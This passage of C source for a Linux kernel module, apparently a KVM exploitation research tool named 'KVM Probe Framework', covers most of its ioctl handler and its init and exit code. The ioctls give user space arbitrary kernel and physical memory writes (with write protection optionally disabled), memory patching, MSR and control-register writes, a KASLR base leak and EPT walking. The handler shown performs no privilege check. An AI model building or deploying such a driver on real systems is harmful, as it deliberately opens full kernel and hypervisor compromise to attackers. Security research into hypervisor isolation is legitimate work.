            if (req.end <= req.start || req.pattern_len > sizeof(req.pattern)) {
                return -EINVAL;
            }

            ret = find_pattern_in_range(req.start, req.end, req.pattern, 
                                         req.pattern_len, &req.found_addr, 1);

            if (ret == 0) {
                if (copy_to_user((void __user *)arg, &req, sizeof(req))) {
                    return -EFAULT;
                }
            }

            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_READ_CR_REGISTER: {
            struct {
                int cr_num;
                unsigned long value;
            } cr_req;

            if (copy_from_user(&cr_req, (void __user *)arg, sizeof(cr_req))) {
                return -EFAULT;
            }

            if (cr_req.cr_num < 0 || cr_req.cr_num > 4 || cr_req.cr_num == 1) {
                return -EINVAL;
            }

            cr_req.value = read_cr_register(cr_req.cr_num);

            return copy_to_user((void __user *)arg, &cr_req, sizeof(cr_req)) ? -EFAULT : 0;
        }

        case IOCTL_READ_MSR: {
            struct msr_read_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.value = native_read_msr(req.msr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        /*
        case IOCTL_DUMP_PAGE_TABLES: {
            struct page_table_dump dump;

            if (copy_from_user(&dump, (void __user *)arg, sizeof(dump))) {
                return -EFAULT;
            }

            if (dump_page_tables(dump.virtual_addr, &dump) < 0) {
                return -EFAULT;
            }

            return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : 0;
        }
        */
#endif

        case IOCTL_GET_KASLR_INFO: {
            struct kaslr_info info;

            if (!g_kaslr_initialized) {
                init_kaslr();
            }

            info.kernel_base = g_kernel_text_base;
            info.kaslr_slide = g_kaslr_slide;

            /* Try to find additional bases */
            info.physmap_base = lookup_kernel_symbol("page_offset_base");
            if (!info.physmap_base) {
                info.physmap_base = PAGE_OFFSET;
            }

            info.vmalloc_base = lookup_kernel_symbol("vmalloc_base");
            if (!info.vmalloc_base) {
                info.vmalloc_base = VMALLOC_START;
            }

            info.vmemmap_base = lookup_kernel_symbol("vmemmap_base");
            if (!info.vmemmap_base) {
                info.vmemmap_base = (unsigned long)vmemmap;
            }

            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        /* ================================================================
         * Step 3: Memory Write Operations
         * ================================================================ */

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kernel_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {  /* Limit to 1MB */
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.disable_wp);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_MEM: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_physical_memory(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_PFN: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_GUEST_MEM: {
            struct guest_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            switch (req.mode) {
                case 0:  /* GPA */
                    ret = write_guest_memory_gpa(req.gpa, kbuf, req.length);
                    break;
                case 1:  /* GVA - not implemented */
                    printk(KERN_WARNING "%s: GVA write not implemented\n", DRIVER_NAME);
                    ret = -ENOSYS;
                    break;
                case 2:  /* GFN */
                    ret = write_guest_memory_gfn(req.gpa, kbuf, req.length);
                    break;
                default:
                    ret = -EINVAL;
            }

            kfree(kbuf);
            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_WRITE_MSR: {
            struct msr_write_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            return write_msr_safe(req.msr, req.value);
        }

        case IOCTL_WRITE_CR_REGISTER: {
            struct cr_write_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) {
                return -EINVAL;
            }

            return write_cr_register(req.cr_num, req.value, req.mask);
        }
#endif

        case IOCTL_MEMSET_KERNEL: {
            struct memset_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.addr || !req.length) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            return memset_kernel_memory(req.addr, req.value, req.length);
        }

        case IOCTL_MEMSET_PHYSICAL: {
            struct memset_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            return memset_physical_memory(req.addr, req.value, req.length);
        }

        case IOCTL_PATCH_BYTES: {
            struct patch_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.addr || req.length == 0 || req.length > 32) {
                return -EINVAL;
            }

            return patch_memory(req.addr, req.original, req.patch, req.length,
                               req.verify_original, req.addr_type);
        }

        /* ================================================================
         * Step 4: Address Conversion Operations
         * ================================================================ */

        case IOCTL_VIRT_TO_PHYS: {
            struct virt_to_phys_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            convert_virt_to_phys(req.virt_addr, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PHYS_TO_VIRT: {
            struct phys_to_virt_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            convert_phys_to_virt(req.phys_addr, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        /*
        case IOCTL_HVA_TO_PFN: {
            struct hva_to_pfn_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            convert_hva_to_pfn(req.hva, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }
        */

        case IOCTL_PFN_TO_HVA: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_VIRT_TO_PFN: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.status = convert_virt_to_pfn(req.input_addr, &req.output_addr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GPA_TO_GFN: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.output_addr = gpa_to_gfn_local(req.input_addr);
            req.status = 0;

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GFN_TO_GPA: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.output_addr = gfn_to_gpa_local(req.input_addr);
            req.status = 0;

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_SPTE_TO_PFN: {
            struct spte_to_pfn_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            spte_to_pfn_local(req.spte, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_WALK_EPT: {
            struct ept_walk_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            walk_ept_tables(req.eptp, req.gpa, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_TRANSLATE_GVA: {
            struct gva_translate_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            translate_gva_to_gpa(req.gva, req.cr3, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PAGE_TO_PFN: {
            struct addr_conv_request req;
            struct page *page;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            page = (struct page *)req.input_addr;
            if (!virt_addr_valid(page)) {
                req.status = -EINVAL;
            } else {
                req.output_addr = page_to_pfn_local(page);
                req.status = 0;
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_PAGE: {
            struct addr_conv_request req;
            struct page *page;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            page = pfn_to_page_local(req.input_addr);
            if (page) {
                req.output_addr = (unsigned long)page;
                req.status = 0;
            } else {
                req.status = -EINVAL;
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_HVA: {
            struct gfn_to_hva_request req;
            unsigned long gpa;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            /* Without KVM context, we approximate: GFN -> GPA -> try physmap */
            gpa = gfn_to_gpa_local(req.gfn);

            /* Check if this GPA falls in typical guest RAM range */
            if (gpa < (1ULL << 40)) {  /* < 1TB */
                /* Try direct map approach */
                req.hva = (unsigned long)__va(gpa);
                if (virt_addr_valid(req.hva)) {
                    req.status = 0;
                } else {
                    req.status = -EFAULT;
                }
            } else {
                req.status = -EINVAL;
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_PFN: {
            struct gfn_to_pfn_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            /* Without KVM memslot context, GFN == PFN for identity-mapped regions */
            req.pfn = req.gfn;
            req.status = 0;

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GPA_TO_HVA: {
            struct gpa_to_hva_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.gfn = gpa_to_gfn_local(req.gpa);

            /* Try direct map for typical guest RAM */
            if (req.gpa < (1ULL << 40)) {
                req.hva = (unsigned long)__va(req.gpa);
                if (virt_addr_valid(req.hva)) {
                    req.status = 0;
                } else {
                    req.status = -EFAULT;
                }
            } else {
                req.status = -EINVAL;
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_GFN: {
            struct addr_conv_request req;
            unsigned long phys;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            /* HVA -> Phys -> GFN */
            if (virt_addr_valid(req.input_addr)) {
                phys = virt_to_phys((void *)req.input_addr);
                req.output_addr = phys >> PAGE_SHIFT;
                req.status = 0;
            } else {
                req.status = -EFAULT;
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        default:
            return -ENOTTY;
    }

    return 0;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */

static int driver_open(struct inode *inode, struct file *file)
{
    printk(KERN_DEBUG "%s: Device opened\n", DRIVER_NAME);
    return 0;
}

static int driver_release(struct inode *inode, struct file *file)
{
    printk(KERN_DEBUG "%s: Device closed\n", DRIVER_NAME);
    return 0;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = driver_open,
    .release = driver_release,
    .unlocked_ioctl = driver_ioctl,
    .compat_ioctl = driver_ioctl,
};

/* ========================================================================
 * Module Init/Exit
 * ======================================================================== */

static int __init mod_init(void)
{
    int ret;

    printk(KERN_INFO "%s: Initializing KVM Probe Framework v2.0\n", DRIVER_NAME);

    /* Initialize kallsyms lookup for newer kernels */
    ret = kallsyms_lookup_init();
    if (ret < 0) {
        printk(KERN_WARNING "%s: kallsyms lookup init failed, some features disabled\n", 
               DRIVER_NAME);
    }

    /* Initialize KASLR detection */
    init_kaslr();

    /* Initialize symbol database */
    ret = init_symbol_database();
    if (ret < 0) {
        printk(KERN_WARNING "%s: No KVM symbols found, some features disabled\n", DRIVER_NAME);
    }

    /* Register character device */
    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) {
        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
        return major_num;
    }

    /* Create device class */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    driver_class = class_create(DRIVER_NAME);
#else
    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
#endif

    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_class);
    }

    /* Create device */
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0),
                                  NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_device);
    }

    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
           DRIVER_NAME, DEVICE_FILE_NAME, major_num);
    printk(KERN_INFO "%s: Found %d KVM symbols, KASLR slide: 0x%lx\n", 
           DRIVER_NAME, kvm_symbol_count, g_kaslr_slide);

    return 0;
}

static void __exit mod_exit(void)
{
    printk(KERN_INFO "%s: Unloading KVM Probe Framework\n", DRIVER_NAME);

    if (driver_device) {
        device_destroy(driver_class, MKDEV(major_num, 0));
    }

    if (driver_class) {
        class_destroy(driver_class);
    }

    if (major_num >= 0) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
    }

    printk(KERN_INFO "%s: Module unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);